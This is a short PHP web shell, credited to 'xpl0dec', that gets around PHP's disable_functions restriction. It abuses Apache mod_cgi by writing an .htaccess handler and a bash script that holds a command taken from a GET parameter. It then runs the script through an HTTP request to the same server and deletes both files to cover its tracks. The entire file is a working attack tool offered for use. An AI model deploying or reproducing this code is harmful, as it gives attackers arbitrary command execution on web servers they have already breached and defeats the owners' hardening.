<?php

//Author by xpl0dec

function checkEnabled($text,$condition,$yes,$no){
        echo "$text: " . ($condition ? $yes : $no) . "<br>\n";
}

function response($url) {

        $parsedUrl = parse_url($url);

        if (!isset($parsedUrl['scheme'])) {
                $url = 'https://' . $url;
        }


        $context = stream_context_create([
                'ssl' => [
                'verify_peer' => true,
                'verify_peer_name' => true,
                ],
        ]);

        $handle = @fopen($url, 'r', false, $context);

        if ($handle === false) {
                $url = preg_replace('/^https:/', 'http:', $url);
                $handle = @fopen($url, 'r');

                if ($handle === false) {
                return "failed access URL....";
                }
        }


        $response = stream_get_contents($handle);
        fclose($handle);

        return $response;
}

$modcgi = in_array('mod_cgi', apache_get_modules());
$writable = is_writable('.');

echo "<h3>Bypass disable function mod_cgi by xpl0dec</h3>";

if(!($modcgi && $writable)){
        echo "Error. mod_cgi and directory must enable and writable";
}else{

        if(isset($_GET['cmd'])) {
                $cmd = $_GET['cmd']; //command to be executed
                $shellfile = "#!/bin/bash\n"; //using a shellscript
                $shellfile .= "echo -ne \"Content-Type: text/html\\n\\n\"\n";
                $shellfile .= "$cmd";
        }else{
                echo "try GET parameter ?cmd=id from execute shell!";
                die();
        }

        $baseUrl = "https://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']) . "/script.bhitech";
        checkEnabled("Write .htaccess file",file_put_contents('.htaccess',"Options +ExecCGI\nAddHandler cgi-script .bhitech") ,"Succeeded!","Failed!");
        checkEnabled("Write shell file",file_put_contents('script.bhitech',$shellfile),"Succeeded!","Failed!");
        checkEnabled("Chmod 777",chmod("script.bhitech",0777),"Succeeded!","Failed!");

        echo "<pre>" . response($baseUrl);
        unlink(".htaccess");
        unlink("script.bhitech");
}
?>
